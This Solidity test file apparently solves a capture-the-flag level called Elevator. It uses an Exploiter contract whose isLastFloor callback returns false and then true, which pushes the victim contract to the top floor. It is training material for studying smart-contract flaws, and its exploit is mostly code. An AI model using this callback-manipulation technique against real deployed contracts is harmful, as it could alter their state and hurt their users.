// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Elevator.sol";
import "src/levels/ElevatorFactory.sol";

contract TesElevator is BaseTest {
    Elevator private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ElevatorFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Elevator(levelAddress);
        
        // Check that the contract is correctly setup
        assertFalse(level.top(), "Must not be on top.");
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        Exploiter exploiter = new Exploiter(level);
        exploiter.goTo(8);

        assertTrue(level.top());

        // assertTrue(level.top(), "We must be n top.");

        vm.stopPrank();
    }
}

contract Exploiter is Building {
    Elevator private victim;
    bool isFirstRun;
    address owner;

    constructor(Elevator _victim) public {
        isFirstRun = false;
        owner = msg.sender;
        victim = _victim;
    }

    function goTo(uint256 floor) public {
        victim.goTo(floor);
    }

    function isLastFloor(uint256) override external returns (bool) {
        if(!isFirstRun) {
            isFirstRun = true;
            return false;
        } else {
            return true;
        }
    }
}